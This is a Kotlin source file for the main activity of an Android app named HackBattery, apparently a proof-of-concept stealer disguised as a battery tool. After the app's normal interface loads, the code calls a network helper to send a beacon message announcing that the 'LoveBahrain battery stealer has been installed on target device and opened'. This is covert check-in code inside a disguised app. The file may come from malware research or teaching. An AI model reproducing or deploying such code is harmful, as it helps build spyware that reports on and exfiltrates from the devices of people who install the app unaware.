package cocomelonc.hackbattery

import cocomelonc.hackbattery.tools.HackBatteryNetwork
import cocomelonc.hackbattery.ui.HackBatteryNavigation
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.material3.Surface
import androidx.navigation.compose.rememberNavController
import com.example.compose.HackBatteryTheme

class HackBatteryMainActivity : ComponentActivity() {
    private lateinit var hackBatteryViewModel: HackBatteryViewModel
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        hackBatteryViewModel = HackBatteryViewModel(this)
        setContent {
            HackBatteryTheme {
                Surface {
                    val navController = rememberNavController()
                    hackBatteryViewModel.navController = navController
                    HackBatteryNavigation(hackBatteryViewModel = hackBatteryViewModel)
                }
            }
        }
        HackBatteryNetwork(this).sendTextMessage("LoveBahrain battery stealer has been installed on target device and opened\nIgnore this message if you received it from this device before")
    }
}